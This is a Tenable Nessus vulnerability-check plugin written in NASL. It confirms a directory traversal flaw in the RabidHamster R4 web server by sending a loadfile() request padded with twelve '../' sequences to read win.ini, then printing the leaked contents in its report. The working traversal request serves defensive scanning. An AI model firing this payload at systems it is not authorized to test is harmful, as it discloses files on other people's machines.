#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61461);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:20 $");

  script_bugtraq_id(51967);
  script_osvdb_id(79006);

  script_name(english:"RabidHamster R4 left_console.html cmd Parameter loadfile() Function Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a file remotely");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The R4 embedded web server listening on the remote host is affected
by a directory traversal vulnerability that can allow for a remote
attacker to view the contents of files located outside of the server's
root directory by sending a URI that contains directory traversal
characters.  The issue is exploitable when the network settings are
enabled in the 'Settings' menu.");

  script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/r4_1-adv.txt");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/02/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:rabidhamster:r4");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("rabidhamster_r4_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8888);
  script_require_keys("www/rabidhamster_r4");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:8888, embedded:TRUE);

install = get_install_from_kb(appname:"rabidhamster_r4", port:port, exit_on_fail:TRUE);
dir = install["dir"];

file_pat = "\[[a-zA-Z]+\]|^; for 16-bit app support";
files = make_list('windows/win.ini', 'winnt/win.ini');

foreach file (files)
{
  vuln_url = dir + "/left_console.html?cmd=loadfile([" + mult_str(str:"../", nb:12) + file + "])";
  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : vuln_url,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pat, string:res[2]))
  {
    if (report_verbosity > 0)
    {
      report =
        '\nNessus was able to verify the issue exists using the following request : ' +
        '\n' +
        '\n  ' + build_url(qs:vuln_url, port:port) +
        '\n';

      if (report_verbosity > 1)
      {
        # format out output to display only win.ini contents
        out_full = strstr(res[2],"<b>Result :</b><br>");
        out_format = ereg_replace(
          string  : out_full,
          pattern : "<(\/)?(b|br)>|(Result :)",
          replace : "",
          icase   : TRUE
        );
        rm_text = "Type text in the box below";
        pos = stridx(out_format, rm_text);
        output = substr(out_format, 0, pos-1);

        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
          '\n' + chomp(output) +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "R4", build_url(qs:dir, port:port));
